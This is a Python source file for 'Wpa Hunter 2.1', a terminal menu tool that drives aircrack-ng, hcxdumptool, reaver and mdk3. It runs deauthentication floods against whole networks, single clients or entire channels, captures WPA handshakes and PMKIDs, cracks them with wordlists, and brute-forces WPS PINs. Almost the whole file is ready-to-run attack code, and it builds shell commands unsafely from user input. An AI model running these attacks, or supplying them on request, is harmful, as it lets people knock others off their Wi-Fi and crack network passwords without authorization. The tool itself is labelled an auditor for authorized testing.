from simple_term_menu import TerminalMenu
from rich.console import Console
from colorama import Fore
from tabulate import tabulate
import fileinput
import threading
import re
import pandas
import time
import os

console = Console()

def animate(i,m):
    with console.status(m + '\n') as status:
        os.system(i)
        time.sleep(1)

def rem():
    for i in range(5):
        if os.path.exists('out-0%s.cap' % i):
            os.remove("out-0%s.cap" % i)
    for i in range(5):
        if os.path.exists('out-0%s.csv' % i):
            os.remove("out-0%s.csv" % i)

def selectnet():
    global bssid
    df = pandas.read_csv('out-01.csv', skipinitialspace=True, usecols=['BSSID'])
    df = df.to_string(justify="left").split("Station MAC", 1)[0]
    df = df[:df.rfind('\n')].split("\n",1)[1]
    macs = []
    for line in df.splitlines():
        macs.append(line[3:])
    mac = TerminalMenu(macs, title="\nChoose BSSID\n").show()
    bssid = macs[mac]

def displaynet():
    bssids = []
    essids = []
    enc = []
    power = []
    channel = []
    file = 'out-01.csv'
    df = pandas.read_csv(file, skipinitialspace=True, usecols=['BSSID'])
    df = df.to_string(justify="left").split("Station MAC", 1)[0]
    df = df[:df.rfind('\n')].split("\n",1)[1]
    for line in df.splitlines():
        bssids.append(f"{Fore.RED}%s{Fore.WHITE}" % line[3:].replace(" ",""))
    df = pandas.read_csv(file, skipinitialspace=True, usecols=['ESSID'])
    df = df.dropna()
    df = df.to_string(justify="left").split("Station MAC", 1)[0]
    df = df.split("\n",1)[1]
    for line in df.splitlines():
        essids.append(f"{Fore.RED}%s{Fore.WHITE}" % line[3:].replace(" ",""))
    df = pandas.read_csv(file, skipinitialspace=True, usecols=['Privacy'])
    df = df.to_string(justify="left").split("BSSID", 1)[0]
    df = df[:df.rfind('\n')].split("\n",1)[1]
    for line in df.splitlines():
        enc.append(f"{Fore.RED}%s{Fore.WHITE}" % line[3:].replace(" ",""))
    df = pandas.read_csv(file, skipinitialspace=True, usecols=['Power'])
    df = df.dropna()
    df = df.to_string(justify="left").split("Station MAC", 1)[0]
    df = df.split("\n",1)[1]
    for line in df.splitlines():
        power.append(f"{Fore.RED}%s{Fore.WHITE}" % line[2:].replace(" ",""))
    df = pandas.read_csv(file, skipinitialspace=True, usecols=['channel'])
    df = df.dropna()
    df = df.to_string(justify="left").split("Power", 1)[0]
    df = df[:df.rfind('\n')].split("\n",1)[1]
    for line in df.splitlines():
        channel.append(f"{Fore.RED}%s{Fore.WHITE}" % line[2:].replace(" ",""))
    table = {f'{Fore.RED}ESSID{Fore.WHITE}': essids, f'{Fore.RED}BSSID{Fore.WHITE}': bssids, f'{Fore.RED}Channel{Fore.WHITE}': channel,f'{Fore.RED}Encryption{Fore.WHITE}': enc, f'{Fore.RED}Power (dBm){Fore.WHITE}': power}
    print(tabulate(table, tablefmt='fancy_grid', headers='keys'))

def selectcli():
    global cli
    found = False
    for line in fileinput.input("out-01.csv",inplace=True):
        if re.match("Station MAC",line):
            found = True
        if found:
            print(line,end="")
        else:
            print(end="")
    df = pandas.read_csv('out-01.csv', skipinitialspace=True, usecols=['Station MAC'])
    df = df.to_string(justify="left").split("\n",1)[1]
    macs = []
    for line in df.splitlines():
        macs.append(line[3:])
    cli = TerminalMenu(macs, title="\nChoose BSSID\n").show()
    cli = macs[cli]

def displaycli():
    found = False
    for line in fileinput.input("out-01.csv",inplace=True):
        if re.match("Station MAC",line):
            found = True
        if found:
            print(line,end="")
        else:
            print(end="")
    station_macs = []
    probed_essids = []
    bssid = []
    power = []
    file = 'out-01.csv'
    df = pandas.read_csv(file, skipinitialspace=True, usecols=['Station MAC'])
    df = df.to_string(justify="left")
    df = df.split("\n",1)[1]
    for line in df.splitlines():
        station_macs.append(f"{Fore.RED}%s{Fore.WHITE}" % line[1:].replace(" ",""))
    df = pandas.read_csv(file, skipinitialspace=True, usecols=['Probed ESSIDs'])
    df = df.to_string(justify="left")
    df = df.split("\n",1)[1].replace("NaN","")
    for line in df.splitlines():
        probed_essids.append(f"{Fore.RED}%s{Fore.WHITE}" % line[1:].replace(" ",""))
    df = pandas.read_csv(file, skipinitialspace=True, usecols=['BSSID'])
    df = df.to_string(justify="left")
    df = df.split("\n",1)[1]
    for line in df.splitlines():
        bssid.append(f"{Fore.RED}%s{Fore.WHITE}" % line[1:].replace(" ",""))
    df = pandas.read_csv(file, skipinitialspace=True, usecols=['Power'])
    df = df.to_string(justify="left")
    df = df.split("\n",1)[1]
    for line in df.splitlines():
        power.append(f"{Fore.RED}%s{Fore.WHITE}" % line[1:].replace(" ",""))
    table = {f'{Fore.RED}Station Macs{Fore.WHITE}': station_macs,f'{Fore.RED}BSSID{Fore.WHITE}': bssid ,f'{Fore.RED}Power (dBm){Fore.WHITE}': power  ,f'{Fore.RED}Probed Networks{Fore.WHITE}': probed_essids}
    print(tabulate(table, tablefmt='fancy_grid', headers='keys'))

def selectinterface():
    global interface
    interfaces = os.popen("ip -j link |jq -r '.[].ifname'").read()
    interface = []
    for line in interfaces.splitlines():
        interface.append(line)
    interface = interface[TerminalMenu(interface).show()]

def monitormode(interface):
    os.system("ifconfig %s down" % interface)
    os.system("iwconfig %s mode monitor" % interface)
    os.system("ifconfig %s up" % interface)

def hcxdumptool(interface):
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Started Hcxdumptool Thread, waiting for PMKID...")
    os.system("rm out.pcapng 2> /dev/zero")
    os.system("hcxdumptool -i %s -o out.pcapng --enable_status 1 --filterlist_ap=mac.txt --filtermode=2 >/dev/null 2>&1" % interface)

def selectwhitelistednets():
    df = pandas.read_csv('out-01.csv', skipinitialspace=True, usecols=['BSSID'])
    df = df.to_string(justify="left").split("Station MAC", 1)[0]
    df = df[:df.rfind('\n')].split("\n",1)[1]
    macs = []
    macs.append("None")
    for line in df.splitlines():
        macs.append(line[3:])
    whitelisted_menu = TerminalMenu(macs,multi_select=True,show_multi_select_hint=False,title='\nSelect Whitelisted Network(s)\n')
    whitelisted = whitelisted_menu.show()
    wrt_file = open("whitelisted_nets.txt", "w")
    for element in whitelisted_menu.chosen_menu_entries:
        if element == "None":
            break
        else:
            pass
        wrt_file.write(element + "\n")
    wrt_file.close()

def selectblacklistedchannels():
    global channels_menu
    global channels
    channels_menu = TerminalMenu(["All Channels","1","2","3","4","5","6","7","8","9","10","11","12","13"],multi_select=True,show_multi_select_hint=False,title='\nSelect Channels you want to attack\n')
    channels = channels_menu.show()
    if 'All Channels' in channels_menu.chosen_menu_entries:
        if 'All Channels' and ('1' or '2' or '3' or '4' or '5' or '6' or '7' or '8' or '9' or '10' or '11' or '12' or '13') in channels_menu.chosen_menu_entries:
            print(f"{Fore.RED}You cant select All Channels and other options!{Fore.RESET}")
            time.sleep(2)
            selectblacklistedchannels()
        else:
            pass
    else:
        pass

rem()
logo = f"""{Fore.GREEN}{Fore.RED}.         {Fore.RED}.
 {Fore.RED}: {Fore.LIGHTWHITE_EX}( {Fore.RED}* {Fore.LIGHTWHITE_EX}) {Fore.RED}:    {Fore.RED}┌─ {Fore.LIGHTBLUE_EX}Wpa Hunter 2.1
{Fore.RED}.  {Fore.LIGHTWHITE_EX}/---\  {Fore.RED}.   {Fore.RED}└─{Fore.WHITE} a wireless network auditor
  {Fore.LIGHTWHITE_EX}/-----\ 
 {Fore.LIGHTWHITE_EX}/       \ 
 """

print(logo)
print(f"""{Fore.WHITE}[ {Fore.GREEN}1 {Fore.WHITE}] {Fore.WHITE}Deauth Network ( Aireplay )
{Fore.WHITE}[ {Fore.GREEN}2 {Fore.WHITE}] {Fore.WHITE}Deauth Client ( Aireplay )
{Fore.WHITE}[ {Fore.GREEN}3 {Fore.WHITE}] {Fore.WHITE}Crack Password ( WPA Handshake )
{Fore.WHITE}[ {Fore.GREEN}4 {Fore.WHITE}] {Fore.WHITE}Crack Password ( PMKID )
{Fore.WHITE}[ {Fore.GREEN}5 {Fore.WHITE}] {Fore.WHITE}Airodump All
{Fore.WHITE}[ {Fore.GREEN}6 {Fore.WHITE}] {Fore.WHITE}Airodump Bssid
{Fore.WHITE}[ {Fore.GREEN}7 {Fore.WHITE}] {Fore.WHITE}Wpa Supplicant
{Fore.WHITE}[ {Fore.GREEN}8 {Fore.WHITE}] {Fore.WHITE}Crack WPS ( reaver )
{Fore.WHITE}[ {Fore.GREEN}9 {Fore.WHITE}] {Fore.WHITE}Netdiscover
{Fore.WHITE}[ {Fore.GREEN}10 {Fore.WHITE}] {Fore.WHITE}Deauth channel(s) ( mdk3 )
{Fore.WHITE}[ {Fore.RED}x {Fore.WHITE}] {Fore.RED}Exit
""")

select = input(f"{Fore.WHITE}Choose > {Fore.RED}")
while select not in ["1","2","3","4","5","6","7","8","9","10","x"]:
    print(f"{Fore.RED} Select valid option!")
    select = input(f"{Fore.WHITE}Choose > {Fore.RED}")

if select == "1":
    os.system("clear")
    print(logo)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    monitormode(interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out  --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    displaynet()
    selectnet()
    rem()
    print("")
    channel = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.WHITE}Choose Channel > {Fore.RED}")
    print("")
    os.system("iwconfig %s channel %s" % (interface,channel))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.WHITE}Set interface {Fore.RED}%s{Fore.WHITE} to channel {Fore.RED}%s" % (interface,channel))
    print("")
    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.RED}Are you sure that you want to start the attack? (yes or no) : ")
    if go == "yes":
        pass
    elif go == "no":
        print(f"{Fore.RESET}")
        exit()
    else:
        exit()
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting!{Fore.RED}")
    print("")
    os.system("aireplay-ng --deauth 0 -a %s %s" % (bssid,interface))
if select == "2":
    os.system("clear")
    print(logo)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    monitormode(interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    displaynet()
    selectnet()
    print("")
    displaycli()
    selectcli()
    rem()
    print("")
    channel = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.WHITE}Choose Channel > {Fore.RED}")
    os.system("iwconfig %s channel %s" % (interface,channel))
    print("")
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.WHITE}Set interface {Fore.RED}%s{Fore.WHITE} to channel {Fore.RED}%s" % (interface,channel))
    print("")
    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.RED}Are you sure that you want to start the attack? (yes or no) : ")
    if go == "yes":
        pass
    elif go == "no":
        print(f"{Fore.RESET}")
        exit()
    else:
        exit()
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting!{Fore.RED}")
    print("")
    os.system("aireplay-ng --deauth 0 -c %s -a %s %s" % (cli,bssid,interface))
if select == "3":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    monitormode(interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    displaynet()
    selectnet()
    rem()
    print("")
    channel = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.WHITE}Channel > {Fore.RED}")
    print("")
    os.system("iwconfig %s channel %s" % (interface,channel))
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.WHITE}Set interface {Fore.RED}%s{Fore.WHITE} to channel {Fore.RED}%s" % (interface,channel))
    print("")
    os.system("aireplay-ng --deauth 3 -a %s %s" % (bssid,interface))
    os.system('airodump-ng --manufacturer --uptime --bssid %s -c %s -w out --output-format cap %s' % (bssid,channel,interface))
    print("")
    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Do you want to crack the password now? (yes or no) : ")
    if go == "yes":
        pass
    elif go == "no":
        print(f"{Fore.RESET}")
        save = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Save file name (with extension) > ")
        os.system("mv out-01.cap " + save)
        exit()
    else:
        exit()
    print(f"{Fore.RESET}")
    print(f"{Fore.GREEN}Choose Password List")
    lists = ["password_4800","password_10000","password_100000"]
    show = TerminalMenu(lists).show()
    os.system("aircrack-ng out-01.cap -w %s" % lists[show])
    rem()
if select == "4":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    monitormode(interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    displaynet()
    selectnet()
    rem()
    os.system("/usr/bin/echo {} > mac.txt".format(bssid.replace(":","")))
    print("")
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.RED}Written bssid {Fore.WHITE}%s{Fore.RED} to mac.txt" % bssid)
    print("")
    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Do you want to crack the password when capture done? (yes or no) :{Fore.WHITE} ")
    if go == "yes":
        lists = ["password_4800","password_10000","password_100000"]
        show = TerminalMenu(lists, title="\nChoose Password List").show()
        print("")
        threading.Thread(target=hcxdumptool,args=[interface]).start()
        while True:
            time.sleep(2)
            result = os.popen('c 2>/dev/null')
            if result.read().find("Message 2 of 4" or "Message 3 of 4" or "Message 4 of 4") !=-1:
                print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.WHITE}PMKID Detected! Cracking and saving to {Fore.RED}cracked.txt{Fore.WHITE}...")
                time.sleep(2)
                os.system("tcpdump -r out.pcapng -w out.pcap 2> /dev/null")
                print(f"{Fore.WHITE}")
                os.system("aircrack-ng -l cracked.txt -w %s out.pcap" % lists[show])
                break
                quit()
    elif go == "no":
        print(f"{Fore.RESET}")
        save = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Save file name (without extension) > {Fore.WHITE}")
        print("")
        threading.Thread(target=hcxdumptool,args=[interface]).start()
        while True:
            time.sleep(2)
            result = os.popen('tshark -r out.pcapng 2>/dev/null')
            if result.read().find("Message 2 of 4" or "Message 3 of 4" or "Message 4 of 4") !=-1:
                print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.WHITE}PMKID Detected! Saving to {Fore.RED}%s.pcap{Fore.WHITE}..." % save)
                os.system("tcpdump -r out.pcapng -w %s.pcap 2> /dev/null" % save)
                print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Saved!")
                break
                quit()
    else:
        exit()
if select == "5":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    monitormode(interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng --manufacturer --uptime -w out --output-format csv " + interface)
    os.system("clear")
    displaynet()
    displaycli()
    print("")
    os.system("bash wfw.sh {}/out-01.csv".format(os.getcwd()))
    rem()
if select == "6":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    monitormode(interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    rem()
    os.system("airodump-ng -w out --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    displaynet()
    selectnet()
    rem()
    os.system("airodump-ng --manufacturer --uptime --bssid %s -w out --output-format csv %s" % (bssid,interface))
    os.system("clear")
    os.system("bash wfw.sh {}/out-01.csv".format(os.getcwd()))
    rem()
if select == "7":
    os.system("clear")
    print(logo)
    print(f"""
{Fore.WHITE}[ {Fore.GREEN}1 {Fore.WHITE}] {Fore.WHITE}Set AP / Enable Wpa Supplicant
{Fore.WHITE}[ {Fore.GREEN}2 {Fore.WHITE}] {Fore.WHITE}Disable Wpa Suplicant
    """)
    choose = input(f"{Fore.WHITE}Choose > {Fore.RED}")
    while choose not in ["1","2"]:
        print(f"{Fore.RED} Select valid option!")
        choose = input(f"{Fore.WHITE}Choose > {Fore.RED}")
    if choose == "1":
        print("")
        print(f"{Fore.GREEN}Select USB Wifi Card")
        print(f"{Fore.WHITE}")
        selectinterface()
        monitormode(interface)
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
        time.sleep(2)
        os.system("airodump-ng --manufacturer --uptime " + interface)
        os.system("clear")
        displaynet()
        print("")
        essid = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}]{Fore.WHITE} Essid > {Fore.RED}")
        key = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}]{Fore.WHITE} Key > {Fore.RED}")
        w = open('/etc/wpa_supplicant/wpa_supplicant.conf', 'w')
        w.write('''ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
Bcountry=HR

network={
    ssid="%s"
    psk="%s"
    key_mgmt=WPA-PSK
}
''' % (essid, key))
        w.close()
        w = open('/etc/wpa_supplicant/wpa_supplicant.conf', 'r')
        print("")
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Written to wpa_supplicant.conf, is this correct?{Fore.WHITE}")
        print("")
        print(w.read())
        animate('systemctl unmask wpa_supplicant.service','[bold white] Unmasking wpa_supplicant')
        animate('systemctl enable wpa_supplicant','[bold white] Enabling wpa_supplicant')
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.RED}Rebooting in 5 seconds...")
        time.sleep(5)
        os.system("reboot")
    if choose == "2":
        print("")
        animate('systemctl mask wpa_supplicant.service','[bold white] Masking wpa_supplicant')
        animate('systemctl disable wpa_supplicant.service','[bold white] Disabling wpa_supplicant')
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.RED}Rebooting in 5 seconds...")
        time.sleep(5)
        os.system("reboot")
if select == "8":
    os.system("clear")
    print(logo)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    monitormode(interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out --wps --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    displaynet()
    print("")
    os.system("wash -i " + interface)
    selectnet()
    rem()
    choose = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}Start reaver in screen session? (yes or no) : ")
    if choose == "yes":
        session = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}What is the session going to be called? : ")
        print("")
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting reaver in screen session {Fore.RED}%s{Fore.GREEN} with verbose level {Fore.RED}2" % session)
        print("")
        time.sleep(2)
        open('reaver_dump.txt','w').write("Running : screen -S %s -L -Logfile reaver_dump.txt -dm reaver -i %s -b %s -vv\n" % (session,interface,bssid))
        os.system("screen -S %s -L -Logfile reaver_dump.txt -dm reaver -i %s -b %s -vv" % (session,interface,bssid))
        choose = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.GREEN}View screen session? (yes or no) : ")
        if choose == "yes":
            print("")
            print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + D + A{Fore.RESET}")
            time.sleep(2)
            os.system("screen -r " + session)
        elif choose == "no":
            exit()
    elif choose == "no":
        print("")
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting reaver with verbose level {Fore.RED}2{Fore.WHITE}")
        os.system("reaver -i %s -b %s -vv" % (interface,bssid))
    else:
        exit()
if select == "9":
    os.system("clear")
    print(logo)
    print(f"{Fore.GREEN}Select Interface With IP You Want To Scan")
    print(f"{Fore.WHITE}")
    selectinterface()
    os.system("netdiscover -i " + interface)
if select == "10":
    os.system("clear")
    print(logo)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Select USB Wifi Card")
    print(f"{Fore.WHITE}")
    selectinterface()
    monitormode(interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Monitor Mode Enabled on interface {Fore.RED}%s" % interface)
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}To stop CTRL + C{Fore.RESET}")
    time.sleep(2)
    os.system("airodump-ng -w out  --manufacturer --uptime --output-format csv " + interface)
    os.system("clear")
    displaynet()
    selectwhitelistednets()
    selectblacklistedchannels()
    rem()
    print("")
    go = input(f"{Fore.WHITE}[{Fore.LIGHTBLUE_EX}q{Fore.WHITE}] {Fore.RED}Are you sure that you want to start the attack? (yes or no) : ")
    print("")
    if go == "yes":
        pass
    elif go == "no":
        print(f"{Fore.RESET}")
        exit()
    else:
        exit()
    print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Starting!{Fore.RED}")
    mdk3_channels = str(channels).replace("(","").replace(")","")
    if 'All Channels' in channels_menu.chosen_menu_entries:
        os.system("mdk3 %s d -w whitelisted_nets.txt -c 1,2,3,4,5,6,7,8,9,10,11,12,13" % interface)
    else:
        print(f"{Fore.WHITE}[{Fore.LIGHTGREEN_EX}i{Fore.WHITE}] {Fore.GREEN}Deauthenticating channels {Fore.RED}%s" % mdk3_channels)
        os.system("mdk3 %s d -w whitelisted_nets.txt -c %s" % (interface,mdk3_channels))

if select == "x":
    print("")
    print(f"{Fore.WHITE}Bye!{Fore.RESET}")
    exit()
